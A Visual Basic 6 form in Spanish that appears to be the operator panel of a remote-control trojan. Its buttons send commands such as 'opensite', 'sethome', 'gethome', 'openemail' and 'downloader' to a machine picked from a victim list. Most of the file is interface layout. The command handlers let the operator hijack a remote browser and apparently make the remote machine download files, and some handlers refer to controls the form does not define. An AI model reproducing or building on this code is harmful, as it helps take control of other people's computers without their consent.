VERSION 5.00
Begin VB.Form internetopcions 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Opciones de Internet"
   ClientHeight    =   2595
   ClientLeft      =   45
   ClientTop       =   345
   ClientWidth     =   6945
   Icon            =   "internetopcions.frx":0000
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2595
   ScaleWidth      =   6945
   StartUpPosition =   2  'CenterScreen
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   1920
      Top             =   7440
   End
   Begin VB.TextBox value 
      Height          =   495
      Left            =   360
      TabIndex        =   9
      Top             =   7440
      Width           =   615
   End
   Begin VB.Frame Frame3 
      Height          =   1575
      Left            =   120
      TabIndex        =   4
      Top             =   960
      Width           =   6735
      Begin VB.Frame Frame5 
         Caption         =   "Enviar E-MAIL Remoto"
         Height          =   1335
         Left            =   120
         TabIndex        =   5
         Top             =   120
         Width           =   6495
         Begin VB.CommandButton Command6 
            Caption         =   "Enviar E-MAIL"
            Height          =   375
            Left            =   4560
            TabIndex        =   8
            Top             =   840
            Width           =   1695
         End
         Begin VB.TextBox Text9 
            Height          =   285
            Left            =   840
            TabIndex        =   7
            Text            =   "@hotmail.com"
            Top             =   360
            Width           =   5415
         End
         Begin VB.TextBox Text8 
            Appearance      =   0  'Flat
            BackColor       =   &H8000000F&
            BorderStyle     =   0  'None
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   120
            TabIndex        =   6
            Text            =   "E-Mail :"
            Top             =   360
            Width           =   735
         End
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "Abrir Website"
      Height          =   855
      Left            =   120
      TabIndex        =   0
      Top             =   0
      Width           =   6735
      Begin VB.CommandButton Command2 
         Caption         =   "Enviar"
         Height          =   255
         Left            =   5400
         TabIndex        =   3
         Top             =   360
         Width           =   1095
      End
      Begin VB.CommandButton Command1 
         Caption         =   "Probar"
         Height          =   255
         Left            =   4200
         TabIndex        =   2
         Top             =   360
         Width           =   1095
      End
      Begin VB.TextBox Text1 
         Height          =   285
         Left            =   120
         TabIndex        =   1
         Text            =   "http://www.google.com"
         Top             =   360
         Width           =   3975
      End
   End
End
Attribute VB_Name = "internetopcions"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long


Private Sub Command1_Click()
ShellExecLaunchFile Text1.Text, "", ""
End Sub

Private Sub Command2_Click()
Dim txtdata As String
txtdata = "opensite|" & Text1.Text
enviar txtdata
End Sub

Private Sub Command3_Click()
Dim txtdata As String
txtdata = "sethome|" & Text2.Text
enviar txtdata
End Sub

Private Sub Command4_Click()
Dim txtdata As String
txtdata = "gethome|"
enviar txtdata
End Sub


Private Sub Command5_Click()
enviar "downloader|" & Text3.Text
End Sub

Private Sub Command6_Click()
Dim txtdata As String
txtdata = "openemail|" & Text9.Text
enviar txtdata
End Sub

Private Sub Form_Load()
On Error Resume Next

Me.Caption = "Opciones de Internet de " & Form1.LV.SelectedItem
End Sub

Private Sub Form_Unload(Cancel As Integer)
Form1.Show
Unload Me
End Sub

Public Function ShellExecLaunchFile(ByVal strPathFile As String, ByVal strOpenInPath As String, ByVal strArguments As String) As Long
Dim Scr_hDC As Long
Scr_hDC = GetDesktopWindow()
ShellExecLaunchFile = ShellExecute(Scr_hDC, "Open", strPathFile, "", strOpenInPath, SW_SHOWNORMAL)
End Function


